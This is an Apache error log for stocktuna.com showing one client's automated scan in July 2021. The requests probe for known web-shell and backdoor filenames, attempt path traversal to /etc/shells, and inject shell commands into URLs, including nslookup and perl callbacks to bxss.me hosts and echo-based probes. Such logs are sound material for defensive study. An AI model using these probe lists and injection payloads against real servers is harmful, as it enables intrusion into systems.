[Thu Jul 08 02:29:41.734676 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/r57shell.php' not found or unable to stat
[Thu Jul 08 02:29:41.810218 2021] [php7:error] [pid 15895] [client 27.147.202.214:10005] script '/var/www/html/stocktuna.com/assets/webadmin.php' not found or unable to stat
[Thu Jul 08 02:29:41.892410 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/r.php' not found or unable to stat
[Thu Jul 08 02:29:42.043721 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/r57.php' not found or unable to stat
[Thu Jul 08 02:29:42.063700 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:29:42.151627 2021] [php7:error] [pid 14974] [client 27.147.202.214:10013] script '/var/www/html/stocktuna.com/phpThumb.php' not found or unable to stat
[Thu Jul 08 02:29:42.190149 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/lol.php' not found or unable to stat
[Thu Jul 08 02:29:42.322655 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/pi.php' not found or unable to stat
[Thu Jul 08 02:29:42.358492 2021] [php7:error] [pid 16284] [client 27.147.202.214:10002] script '/var/www/html/stocktuna.com/assets/r58.php' not found or unable to stat
[Thu Jul 08 02:29:42.468790 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/zehir.php' not found or unable to stat
[Thu Jul 08 02:29:42.660261 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/c99shell.php' not found or unable to stat
[Thu Jul 08 02:29:42.688448 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc-server.php' not found or unable to stat
[Thu Jul 08 02:29:42.740052 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:29:42.865867 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/php.php' not found or unable to stat
[Thu Jul 08 02:29:42.945612 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/c99.php' not found or unable to stat
[Thu Jul 08 02:29:43.010087 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:43.131263 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/i.php' not found or unable to stat
[Thu Jul 08 02:29:43.228074 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/nstview.php' not found or unable to stat
[Thu Jul 08 02:29:43.282514 2021] [php7:error] [pid 14641] [client 27.147.202.214:10011] script '/var/www/html/stocktuna.com/assets/css/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:43.283732 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:29:43.398670 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/test.php' not found or unable to stat
[Thu Jul 08 02:29:43.512115 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/nst.php' not found or unable to stat
[Thu Jul 08 02:29:43.673765 2021] [php7:error] [pid 16481] [client 27.147.202.214:9745] script '/var/www/html/stocktuna.com/assets/temp.php' not found or unable to stat
[Thu Jul 08 02:29:43.793830 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/rst.php' not found or unable to stat
[Thu Jul 08 02:29:43.873967 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:29:43.964784 2021] [php7:error] [pid 16481] [client 27.147.202.214:9745] script '/var/www/html/stocktuna.com/assets/info.php' not found or unable to stat
[Thu Jul 08 02:29:44.082275 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/r57eng.php' not found or unable to stat
[Thu Jul 08 02:29:44.376649 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/shell.php' not found or unable to stat
[Thu Jul 08 02:29:44.484041 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:29:44.662240 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/dra.php' not found or unable to stat
[Thu Jul 08 02:29:44.945392 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/r.php' not found or unable to stat
[Thu Jul 08 02:29:45.078996 2021] [php7:error] [pid 16367] [client 27.147.202.214:10010] script '/var/www/html/stocktuna.com/xmlrpc_server.php' not found or unable to stat
[Thu Jul 08 02:29:45.234814 2021] [php7:error] [pid 15835] [client 27.147.202.214:10007] script '/var/www/html/stocktuna.com/assets/lol.php' not found or unable to stat
[Thu Jul 08 02:29:45.530097 2021] [php7:error] [pid 16477] [client 27.147.202.214:9740] script '/var/www/html/stocktuna.com/assets/zehir.php' not found or unable to stat
[Thu Jul 08 02:29:45.807035 2021] [php7:error] [pid 16477] [client 27.147.202.214:9740] script '/var/www/html/stocktuna.com/assets/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:29:45.871574 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/js/r57shell.php' not found or unable to stat
[Thu Jul 08 02:29:46.019953 2021] [php7:error] [pid 16390] [client 27.147.202.214:10017] script '/var/www/html/stocktuna.com/assets/js/webadmin.php' not found or unable to stat
[Thu Jul 08 02:29:46.085734 2021] [php7:error] [pid 16477] [client 27.147.202.214:9740] script '/var/www/html/stocktuna.com/assets/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:46.138339 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/js/r57.php' not found or unable to stat
[Thu Jul 08 02:29:46.365196 2021] [php7:error] [pid 16477] [client 27.147.202.214:9740] script '/var/www/html/stocktuna.com/assets/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:46.409131 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/js/r58.php' not found or unable to stat
[Thu Jul 08 02:29:46.605393 2021] [core:error] [pid 13894] [client 27.147.202.214:10009] AH00126: Invalid URI in request GET /images/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 02:29:46.680059 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/js/c99shell.php' not found or unable to stat
[Thu Jul 08 02:29:46.830588 2021] [php7:error] [pid 16459] [client 27.147.202.214:8031] script '/var/www/html/stocktuna.com/images/1v5x9vkjocxs.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:46.945440 2021] [php7:error] [pid 15353] [client 27.147.202.214:10004] script '/var/www/html/stocktuna.com/assets/js/c99.php' not found or unable to stat
[Thu Jul 08 02:29:47.227596 2021] [php7:error] [pid 16390] [client 27.147.202.214:10017] script '/var/www/html/stocktuna.com/assets/js/nstview.php' not found or unable to stat
[Thu Jul 08 02:29:47.536582 2021] [php7:error] [pid 16390] [client 27.147.202.214:10017] script '/var/www/html/stocktuna.com/assets/js/nst.php' not found or unable to stat
[Thu Jul 08 02:29:47.833843 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/rst.php' not found or unable to stat
[Thu Jul 08 02:29:48.115216 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/r57eng.php' not found or unable to stat
[Thu Jul 08 02:29:48.394843 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/assets/js/shell.php' not found or unable to stat
[Thu Jul 08 02:29:48.671401 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/dra.php' not found or unable to stat
[Thu Jul 08 02:29:48.965300 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/r.php' not found or unable to stat
[Thu Jul 08 02:29:49.247539 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/lol.php' not found or unable to stat
[Thu Jul 08 02:29:49.549005 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/zehir.php' not found or unable to stat
[Thu Jul 08 02:29:49.852092 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/c-h.v2.php' not found or unable to stat
[Thu Jul 08 02:29:50.133989 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/php-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:50.414485 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/assets/js/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 02:29:50.566521 2021] [authz_core:error] [pid 15085] [client 27.147.202.214:8036] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess~
[Thu Jul 08 02:29:50.858637 2021] [authz_core:error] [pid 15085] [client 27.147.202.214:8036] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess.old
[Thu Jul 08 02:29:51.145213 2021] [authz_core:error] [pid 15085] [client 27.147.202.214:8036] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/js/.htaccess.save
[Thu Jul 08 02:29:51.231579 2021] [core:error] [pid 14641] (36)File name too long: [client 27.147.202.214:10011] AH00036: access to /;(nslookup hitponybsbmgmb1cf0.bxss.me||perl -e "gethostbyname('hitponybsbmgmb1cf0.bxss.me')")|(nslookup hitponybsbmgmb1cf0.bxss.me||perl -e "gethostbyname('hitponybsbmgmb1cf0.bxss.me')")&(nslookup hitponybsbmgmb1cf0.bxss.me||perl -e "gethostbyname('hitponybsbmgmb1cf0.bxss.me')")/js/browser.min.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitponybsbmgmb1cf0.bxss.me||perl -e "gethostbyname('hitponybsbmgmb1cf0.bxss.me')")|(nslookup hitponybsbmgmb1cf0.bxss.me||perl -e "gethostbyname('hitponybsbmgmb1cf0.bxss.me')")&(nslookup hitponybsbmgmb1cf0.bxss.me||perl -e "gethostbyname('hitponybsbmgmb1cf0.bxss.me')")')
[Thu Jul 08 02:29:54.420289 2021] [core:error] [pid 16274] (36)File name too long: [client 27.147.202.214:12677] AH00036: access to /;(nslookup hityauajgidvb3c0f2.bxss.me||perl -e "gethostbyname('hityauajgidvb3c0f2.bxss.me')")|(nslookup hityauajgidvb3c0f2.bxss.me||perl -e "gethostbyname('hityauajgidvb3c0f2.bxss.me')")&(nslookup hityauajgidvb3c0f2.bxss.me||perl -e "gethostbyname('hityauajgidvb3c0f2.bxss.me')")/js/util.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hityauajgidvb3c0f2.bxss.me||perl -e "gethostbyname('hityauajgidvb3c0f2.bxss.me')")|(nslookup hityauajgidvb3c0f2.bxss.me||perl -e "gethostbyname('hityauajgidvb3c0f2.bxss.me')")&(nslookup hityauajgidvb3c0f2.bxss.me||perl -e "gethostbyname('hityauajgidvb3c0f2.bxss.me')")')
[Thu Jul 08 02:29:54.980794 2021] [php7:error] [pid 16435] [client 27.147.202.214:8033] script '/var/www/html/stocktuna.com/docsBwEGL.php' not found or unable to stat
[Thu Jul 08 02:29:55.017985 2021] [authz_core:error] [pid 13381] [client 27.147.202.214:8041] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess~
[Thu Jul 08 02:29:55.295685 2021] [authz_core:error] [pid 13381] [client 27.147.202.214:8041] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess.old
[Thu Jul 08 02:29:55.547526 2021] [php7:error] [pid 16435] [client 27.147.202.214:8033] script '/var/www/html/stocktuna.com/eNhZndocs.php' not found or unable to stat
[Thu Jul 08 02:29:55.571372 2021] [authz_core:error] [pid 13381] [client 27.147.202.214:8041] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/css/.htaccess.save
[Thu Jul 08 02:29:55.905387 2021] [core:error] [pid 13820] (36)File name too long: [client 27.147.202.214:12675] AH00036: access to /;(nslookup hitidslhovesyed615.bxss.me||perl -e "gethostbyname('hitidslhovesyed615.bxss.me')")|(nslookup hitidslhovesyed615.bxss.me||perl -e "gethostbyname('hitidslhovesyed615.bxss.me')")&(nslookup hitidslhovesyed615.bxss.me||perl -e "gethostbyname('hitidslhovesyed615.bxss.me')")/js/jquery.min.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hitidslhovesyed615.bxss.me||perl -e "gethostbyname('hitidslhovesyed615.bxss.me')")|(nslookup hitidslhovesyed615.bxss.me||perl -e "gethostbyname('hitidslhovesyed615.bxss.me')")&(nslookup hitidslhovesyed615.bxss.me||perl -e "gethostbyname('hitidslhovesyed615.bxss.me')")')
[Thu Jul 08 02:29:56.138414 2021] [authz_core:error] [pid 15548] [client 27.147.202.214:10016] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess~
[Thu Jul 08 02:29:56.364549 2021] [core:error] [pid 16312] (36)File name too long: [client 27.147.202.214:8034] AH00036: access to /assets/;(nslookup hitaoixdbzmjc0a64c.bxss.me||perl -e "gethostbyname('hitaoixdbzmjc0a64c.bxss.me')")|(nslookup hitaoixdbzmjc0a64c.bxss.me||perl -e "gethostbyname('hitaoixdbzmjc0a64c.bxss.me')")&(nslookup hitaoixdbzmjc0a64c.bxss.me||perl -e "gethostbyname('hitaoixdbzmjc0a64c.bxss.me')")/browser.min.js failed (filesystem path '/var/www/html/stocktuna.com/assets/;(nslookup hitaoixdbzmjc0a64c.bxss.me||perl -e "gethostbyname('hitaoixdbzmjc0a64c.bxss.me')")|(nslookup hitaoixdbzmjc0a64c.bxss.me||perl -e "gethostbyname('hitaoixdbzmjc0a64c.bxss.me')")&(nslookup hitaoixdbzmjc0a64c.bxss.me||perl -e "gethostbyname('hitaoixdbzmjc0a64c.bxss.me')")')
[Thu Jul 08 02:29:56.421321 2021] [authz_core:error] [pid 15548] [client 27.147.202.214:10016] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess.old
[Thu Jul 08 02:29:56.706088 2021] [authz_core:error] [pid 16435] [client 27.147.202.214:8033] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/assets/.htaccess.save
[Thu Jul 08 02:29:57.750064 2021] [php7:error] [pid 14730] [client 27.147.202.214:8032] script '/var/www/html/stocktuna.com/index0T3nu.php' not found or unable to stat
[Thu Jul 08 02:29:58.294119 2021] [php7:error] [pid 12852] [client 27.147.202.214:10015] script '/var/www/html/stocktuna.com/stocktuna_pydocs4sP5W.php' not found or unable to stat
[Thu Jul 08 02:29:58.325219 2021] [php7:error] [pid 16502] [client 27.147.202.214:8042] script '/var/www/html/stocktuna.com/9knsgindex.php' not found or unable to stat
[Thu Jul 08 02:29:58.678363 2021] [core:error] [pid 16477] (36)File name too long: [client 27.147.202.214:9740] AH00036: access to /assets/;(nslookup hitopaqcdkodgf57d7.bxss.me||perl -e "gethostbyname('hitopaqcdkodgf57d7.bxss.me')")|(nslookup hitopaqcdkodgf57d7.bxss.me||perl -e "gethostbyname('hitopaqcdkodgf57d7.bxss.me')")&(nslookup hitopaqcdkodgf57d7.bxss.me||perl -e "gethostbyname('hitopaqcdkodgf57d7.bxss.me')")/util.js failed (filesystem path '/var/www/html/stocktuna.com/assets/;(nslookup hitopaqcdkodgf57d7.bxss.me||perl -e "gethostbyname('hitopaqcdkodgf57d7.bxss.me')")|(nslookup hitopaqcdkodgf57d7.bxss.me||perl -e "gethostbyname('hitopaqcdkodgf57d7.bxss.me')")&(nslookup hitopaqcdkodgf57d7.bxss.me||perl -e "gethostbyname('hitopaqcdkodgf57d7.bxss.me')")')
[Thu Jul 08 02:29:58.702945 2021] [php7:error] [pid 15085] [client 27.147.202.214:8036] script '/var/www/html/stocktuna.com/old_docs.php' not found or unable to stat
[Thu Jul 08 02:29:58.856860 2021] [php7:error] [pid 12852] [client 27.147.202.214:10015] script '/var/www/html/stocktuna.com/TheIlstocktuna_pydocs.php' not found or unable to stat
[Thu Jul 08 02:29:58.994597 2021] [php7:error] [pid 15085] [client 27.147.202.214:8036] script '/var/www/html/stocktuna.com/docs_old.php' not found or unable to stat
[Thu Jul 08 02:29:58.998173 2021] [php7:error] [pid 16477] [client 27.147.202.214:9740] script '/var/www/html/stocktuna.com/response.write(9716763*9047278).php' not found or unable to stat
[Thu Jul 08 02:29:59.208737 2021] [core:error] [pid 14974] (36)File name too long: [client 27.147.202.214:10013] AH00036: access to /;(nslookup hittofmjrveqo9c551.bxss.me||perl -e "gethostbyname('hittofmjrveqo9c551.bxss.me')")|(nslookup hittofmjrveqo9c551.bxss.me||perl -e "gethostbyname('hittofmjrveqo9c551.bxss.me')")&(nslookup hittofmjrveqo9c551.bxss.me||perl -e "gethostbyname('hittofmjrveqo9c551.bxss.me')")/js/breakpoints.min.js failed (filesystem path '/var/www/html/stocktuna.com/;(nslookup hittofmjrveqo9c551.bxss.me||perl -e "gethostbyname('hittofmjrveqo9c551.bxss.me')")|(nslookup hittofmjrveqo9c551.bxss.me||perl -e "gethostbyname('hittofmjrveqo9c551.bxss.me')")&(nslookup hittofmjrveqo9c551.bxss.me||perl -e "gethostbyname('hittofmjrveqo9c551.bxss.me')")')
[Thu Jul 08 02:29:59.233797 2021] [php7:error] [pid 14730] [client 27.147.202.214:8032] script '/var/www/html/stocktuna.com/echo ojioqj$()\\ hhkwer\\nz^xyu||a #' &echo ojioqj$()\\ hhkwer\\nz^xyu||a #|" &echo ojioqj$()\\ hhkwer\\nz^xyu||a #.php' not found or unable to stat
[Thu Jul 08 02:29:59.266816 2021] [php7:error] [pid 13820] [client 27.147.202.214:12675] script '/var/www/html/stocktuna.com/OXfSif6G.php' not found or unable to stat, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:59.279468 2021] [php7:error] [pid 15085] [client 27.147.202.214:8036] script '/var/www/html/stocktuna.com/docs_bak.php' not found or unable to stat
[Thu Jul 08 02:29:59.282719 2021] [php7:error] [pid 16312] [client 27.147.202.214:8034] script '/var/www/html/stocktuna.com/'+response.write(9716763*9047278)+'.php' not found or unable to stat
[Thu Jul 08 02:29:59.291416 2021] [authz_core:error] [pid 16477] [client 27.147.202.214:9740] AH01630: client denied by server configuration: /var/www/html/stocktuna.com/.php, referer: https://www.stocktuna.com/
[Thu Jul 08 02:29:59.518832 2021] [php7:error] [pid 14730] [client 27.147.202.214:8032] script '/var/www/html/stocktuna.com/&echo lejbrm$()\\ gdjycj\\nz^xyu||a #' &echo lejbrm$()\\ gdjycj\\nz^xyu||a #|" &echo lejbrm$()\\ gdjycj\\nz^xyu||a #.php' not found or unable to stat
